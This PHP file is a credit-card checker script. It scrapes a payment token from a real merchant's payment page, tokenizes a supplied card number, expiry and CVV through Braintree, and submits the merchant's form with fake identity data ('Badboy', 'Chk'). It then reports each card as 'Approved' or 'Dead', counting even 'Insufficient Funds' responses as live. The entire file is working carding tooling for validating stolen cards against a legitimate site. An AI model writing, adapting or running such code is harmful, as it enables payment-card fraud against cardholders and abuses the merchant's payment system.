<?php



function getStr($str, $startDelimiter, $endDelimiter) {
    $startDelimiterLength = strlen($startDelimiter);
    $startPos = strpos($str, $startDelimiter);
    if ($startPos === false) {
        return '';
    }
    $startPos += $startDelimiterLength;
    $endPos = strpos($str, $endDelimiter, $startPos);
    if ($endPos === false) {
        return '';
    }
    return substr($str, $startPos, $endPos - $startPos);
}

function checkcharge($cc, $mes, $ano, $cvv) {



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payment.windownation.com/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: payment.windownation.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control: max-age=0',
    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryZrHvKF5GysOPkPRW',
    'origin: https://payment.windownation.com',
    'referer: https://payment.windownation.com/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: iframe',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
]);

$r1 = curl_exec($ch);

curl_close($ch);


$nonce = getStr($r1, '"nonce":"', '",');
$clientToken = getStr($r1, '"client_token":"', '",');
$vh = getStr($r1, '"version_hash":"','",');

  $decoded = base64_decode($clientToken);
  
$data = json_decode($decoded, true);
   $bearer = $data['authorizationFingerprint'];
  
  

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: payments.braintree-api.com',
    'accept: */*',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization: Bearer '.$bearer.'',
    'braintree-version: 2018-05-10',
    'content-type: application/json',
    'origin: https://assets.braintreegateway.com',
    'referer: https://assets.braintreegateway.com/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"53afd9ad-7fab-4c1f-9b50-ff91359d0707"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","billingAddress":{"postalCode":"90023"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

   $r2 = curl_exec($ch);
   $data = json_decode($r2, true);
   
  $token = getStr($r2, '"token":"', '",');
   
   
   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payment.windownation.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: payment.windownation.com',
    'accept: application/json, text/javascript, */*; q=0.01',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://payment.windownation.com',
    'referer: https://payment.windownation.com/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with: XMLHttpRequest',
  
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=gform_payment_preview_html&nonce='.$nonce.'&card_type=DebitCard&form_id=10&form_data%5B0%5D%5Bname%5D=input_2&form_data%5B0%5D%5Bvalue%5D=Badboy&form_data%5B1%5D%5Bname%5D=input_3&form_data%5B1%5D%5Bvalue%5D=Chk&form_data%5B2%5D%5Bname%5D=input_4&form_data%5B2%5D%5Bvalue%5D=736+street&form_data%5B3%5D%5Bname%5D=input_7&form_data%5B3%5D%5Bvalue%5D=California&form_data%5B4%5D%5Bname%5D=input_9&form_data%5B4%5D%5Bvalue%5D=Colorado&form_data%5B5%5D%5Bname%5D=input_11&form_data%5B5%5D%5Bvalue%5D=90023&form_data%5B6%5D%5Bname%5D=input_12&form_data%5B6%5D%5Bvalue%5D=United+Kingdom&form_data%5B7%5D%5Bname%5D=input_13&form_data%5B7%5D%5Bvalue%5D=3049758495&form_data%5B8%5D%5Bname%5D=input_10&form_data%5B8%5D%5Bvalue%5D=badboychx1%40gmail.com&form_data%5B9%5D%5Bname%5D=input_23&form_data%5B9%5D%5Bvalue%5D=3049758495&form_data%5B10%5D%5Bname%5D=payment_method_nonce&form_data%5B10%5D%5Bvalue%5D=tokencc_bh_gxvj94_7fmsqk_sgt7yd_gsm82f_nb7&form_data%5B11%5D%5Bname%5D=payment_card_type&form_data%5B11%5D%5Bvalue%5D=DebitCard&form_data%5B12%5D%5Bname%5D=input_32.1&form_data%5B12%5D%5Bvalue%5D=4026+(Visa)&form_data%5B13%5D%5Bname%5D=input_15&form_data%5B13%5D%5Bvalue%5D=1&form_data%5B14%5D%5Bname%5D=input_19.4&form_data%5B14%5D%5Bvalue%5D=&form_data%5B15%5D%5Bname%5D=input_19.5&form_data%5B15%5D%5Bvalue%5D=90023&form_data%5B16%5D%5Bname%5D=input_19.6&form_data%5B16%5D%5Bvalue%5D=United+States&form_data%5B17%5D%5Bname%5D=input_33&form_data%5B17%5D%5Bvalue%5D=&form_data%5B18%5D%5Bname%5D=gform_ajax&form_data%5B18%5D%5Bvalue%5D=form_id%3D10%26title%3D%26description%3D%26tabindex%3D0%26theme%3Dlegacy&form_data%5B19%5D%5Bname%5D=is_submit_10&form_data%5B19%5D%5Bvalue%5D=1&form_data%5B20%5D%5Bname%5D=gform_submit&form_data%5B20%5D%5Bvalue%5D=10&form_data%5B21%5D%5Bname%5D=gform_unique_id&form_data%5B21%5D%5Bvalue%5D=&form_data%5B22%5D%5Bname%5D=state_10&form_data%5B22%5D%5Bvalue%5D=WyJbXSIsIjcxMGM3MTQ5NTBhNGUxYWYyM2M0N2FhMGMwNGJkOGRmIl0%3D&form_data%5B23%5D%5Bname%5D=gform_target_page_number_10&form_data%5B23%5D%5Bvalue%5D=0&form_data%5B24%5D%5Bname%5D=gform_source_page_number_10&form_data%5B24%5D%5Bvalue%5D=1&form_data%5B25%5D%5Bname%5D=gform_field_values&form_data%5B25%5D%5Bvalue%5D=&form_data%5B26%5D%5Bname%5D=version_hash&form_data%5B26%5D%5Bvalue%5D='.$vh.'&form_data%5B27%5D%5Bname%5D=version_hash&form_data%5B27%5D%5Bvalue%5D='.$vh.'&form_data%5B28%5D%5Bname%5D=version_hash&form_data%5B28%5D%5Bvalue%5D='.$vh.'&form_data%5B29%5D%5Bname%5D=version_hash&form_data%5B29%5D%5Bvalue%5D='.$vh.'&form_data%5B30%5D%5Bname%5D=version_hash&form_data%5B30%5D%5Bvalue%5D='.$vh.'&form_data%5B31%5D%5Bname%5D=version_hash&form_data%5B31%5D%5Bvalue%5D='.$vh.'&form_data%5B32%5D%5Bname%5D=version_hash&form_data%5B32%5D%5Bvalue%5D='.$vh.'&form_data%5B33%5D%5Bname%5D=version_hash&form_data%5B33%5D%5Bvalue%5D='.$vh.'&form_data%5B34%5D%5Bname%5D=version_hash&form_data%5B34%5D%5Bvalue%5D='.$vh.'&form_data%5B35%5D%5Bname%5D=version_hash&form_data%5B35%5D%5Bvalue%5D='.$vh.'&form_data%5B36%5D%5Bname%5D=version_hash&form_data%5B36%5D%5Bvalue%5D='.$vh.'&form_data%5B37%5D%5Bname%5D=version_hash&form_data%5B37%5D%5Bvalue%5D='.$vh.'&form_data%5B38%5D%5Bname%5D=version_hash&form_data%5B38%5D%5Bvalue%5D='.$vh.'&form_data%5B39%5D%5Bname%5D=version_hash&form_data%5B39%5D%5Bvalue%5D='.$vh.'&form_data%5B40%5D%5Bname%5D=version_hash&form_data%5B40%5D%5Bvalue%5D='.$vh.'&form_data%5B41%5D%5Bname%5D=version_hash&form_data%5B41%5D%5Bvalue%5D='.$vh.'&form_data%5B42%5D%5Bname%5D=version_hash&form_data%5B42%5D%5Bvalue%5D='.$vh.'&form_data%5B43%5D%5Bname%5D=version_hash&form_data%5B43%5D%5Bvalue%5D='.$vh.'&form_data%5B44%5D%5Bname%5D=version_hash&form_data%5B44%5D%5Bvalue%5D='.$vh.'&form_data%5B45%5D%5Bname%5D=version_hash&form_data%5B45%5D%5Bvalue%5D='.$vh.'&form_data%5B46%5D%5Bname%5D=version_hash&form_data%5B46%5D%5Bvalue%5D='.$vh.'&form_data%5B47%5D%5Bname%5D=version_hash&form_data%5B47%5D%5Bvalue%5D='.$vh.'&form_data%5B48%5D%5Bname%5D=version_hash&form_data%5B48%5D%5Bvalue%5D='.$vh.'&form_data%5B49%5D%5Bname%5D=version_hash&form_data%5B49%5D%5Bvalue%5D='.$vh.'&form_data%5B50%5D%5Bname%5D=version_hash&form_data%5B50%5D%5Bvalue%5D='.$vh.'&form_data%5B51%5D%5Bname%5D=version_hash&form_data%5B51%5D%5Bvalue%5D='.$vh.'&form_data%5B52%5D%5Bname%5D=version_hash&form_data%5B52%5D%5Bvalue%5D='.$vh.'');

 $r3 = curl_exec($ch);

curl_close($ch);
   
   
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payment.windownation.com/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: payment.windownation.com',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control: max-age=0',
    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryZrHvKF5GysOPkPRW',
    'origin: https://payment.windownation.com',
    'referer: https://payment.windownation.com/',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: iframe',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_2"

Badboy
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_3"

Chk
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_4"

736 street
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_7"

California
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_9"

Colorado
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_11"

90023
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_12"

United Kingdom
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_13"

3049758495
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_10"

badboychx1@gmail.com
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_23"

3049758495
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="payment_method_nonce"

'.$token.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="payment_card_type"

DebitCard
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_32.1"

4026 (Visa)
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_15"

1
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_19.4"


------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_19.5"

90023
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_19.6"

United States
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="input_33"


------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="gform_ajax"

form_id=10&title=&description=&tabindex=0&theme=legacy
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="is_submit_10"

1
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="gform_submit"

10
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="gform_unique_id"


------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="state_10"

WyJbXSIsIjcxMGM3MTQ5NTBhNGUxYWYyM2M0N2FhMGMwNGJkOGRmIl0=
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="gform_target_page_number_10"

0
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="gform_source_page_number_10"

1
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="gform_field_values"


------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW
Content-Disposition: form-data; name="version_hash"

'.$vh.'
------WebKitFormBoundaryZrHvKF5GysOPkPRW--
');

$result = curl_exec($ch);

curl_close($ch);

$msg = getStr($result, 'Your card could not be billed. Please ensure the details you entered are correct and try again.. Your bank said:', '..');

if(empty($msg))
{
$msg = getStr($result, 'Your card could not be billed. Please ensure the details you entered are correct and try again.. Your bank said:', '.');
}


if (strpos($result, 'Thank you')){
    return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
      //  sender($lista);
    } 
    elseif (strpos($result, 'Approved')){
    return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
       // sender($lista);
    } 
    elseif (strpos($result, 'Insufficient Funds')){
    return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
       // sender($lista);
    } 
    else {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Dead - $msg  ";
    }
/*
if (strpos($result, ' customer authentication')){
    return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    }
        elseif (strpos($result, 'success":true')){
    return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    
    }
    
     elseif(strpos($result, "Your card has insufficient funds.") || strpos($result, "insufficient_funds")) {
   
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    } elseif(strpos($result, 'security code is incorrect.') !== false || strpos($result, 'security code is invalid.') !== false || strpos($result, "incorrect_cvc") !== false) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    } elseif(strpos($result, "Invalid account.")) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    } elseif(strpos($result, "Your card does not support this type of purchase.")) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    } elseif(strpos($result, "stripe_3ds2_fingerprint")) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Approved";
    }
     elseif (strpos($result, 'verify')) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Dead ";
    }
    elseif (strpos($result, 'Your card was declined')) {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Dead ";
    } else {
    
return "Checked card: $cc, Expiration: $mes/$ano, CVV: $cvv - Status: Dead ";
    }
    */
}

